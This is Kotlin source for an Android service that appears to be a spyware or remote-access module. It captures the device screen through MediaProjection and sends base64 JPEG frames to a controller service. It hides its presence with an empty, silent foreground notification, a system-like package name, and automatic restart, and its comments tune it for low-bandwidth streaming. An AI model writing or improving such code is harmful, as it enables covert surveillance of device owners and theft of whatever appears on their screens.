package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import com.system.service.core.CoreService
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicBoolean

class ScreenStreamService : Service() {

    companion object {
        var isRunning = false
        var projectionResultCode: Int = 0
        var projectionResultData: Intent? = null
        private const val CHANNEL_ID = "screen_stream"
        private const val NOTIF_ID   = 12
    }

    private val streaming = AtomicBoolean(false)
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var intervalMs: Long = 1000L
    private var captureScheduled = false
    // Lag fix: track last frame hash to skip duplicate frames
    private var lastFrameHash = 0

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
        if (projectionResultData == null) { stopSelf(); return START_NOT_STICKY }
        createChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, buildNotif())
        }
        intervalMs = (intent?.getLongExtra("interval", 1000L) ?: 1000L).coerceAtLeast(300L)
        isRunning = true
        streaming.set(true)
        captureScheduled = false
        startProjection()
        return START_STICKY
    }

    private fun startProjection() {
        thread = HandlerThread("ScreenStream", Process.THREAD_PRIORITY_DISPLAY).apply { start() }
        handler = Handler(thread!!.looper)

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(projectionResultCode, projectionResultData!!)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getMetrics(metrics)

        // LAG FIX: Use 1/4 resolution — 4x fewer pixels to encode, much faster
        val width  = metrics.widthPixels  / 4
        val height = metrics.heightPixels / 4
        val dpi    = metrics.densityDpi   / 4

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection!!.createVirtualDisplay(
            "screen_capture", width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, handler)

        scheduleCapture(width, height)
    }

    private fun scheduleCapture(w: Int, h: Int) {
        if (!streaming.get() || captureScheduled) return
        captureScheduled = true
        handler?.postDelayed({
            captureScheduled = false
            if (!streaming.get()) return@postDelayed
            try {
                val img: Image = imageReader?.acquireLatestImage() ?: run {
                    scheduleCapture(w, h); return@postDelayed
                }
                val plane = img.planes[0]
                val rowStride    = plane.rowStride
                val pixelStride  = plane.pixelStride
                val buf          = plane.buffer
                val bmp = Bitmap.createBitmap(rowStride / pixelStride, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(buf)
                img.close()

                val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                bmp.recycle()

                // LAG FIX: Skip if frame is identical (save bandwidth)
                val hash = cropped.hashCode()
                if (hash == lastFrameHash) {
                    cropped.recycle()
                    scheduleCapture(w, h)
                    return@postDelayed
                }
                lastFrameHash = hash

                val baos = ByteArrayOutputStream()
                // LAG FIX: Quality 25 instead of 50 — half the data, same readability
                cropped.compress(Bitmap.CompressFormat.JPEG, 25, baos)
                cropped.recycle()

                val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                CoreService.instance?.sendData("screen_frame", JSONObject().apply {
                    put("frame", b64); put("w", w); put("h", h)
                })
            } catch (_: Exception) {}
            scheduleCapture(w, h)
        }, intervalMs)
    }

    private fun stopStream() {
        streaming.set(false); isRunning = false
        try { virtualDisplay?.release() }  catch (_: Exception) {}
        try { imageReader?.close() }       catch (_: Exception) {}
        try { mediaProjection?.stop() }    catch (_: Exception) {}
        thread?.quitSafely()
    }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Screen", NotificationManager.IMPORTANCE_NONE)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("").setContentText("")
        .setSmallIcon(android.R.drawable.screen_background_dark).build()

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
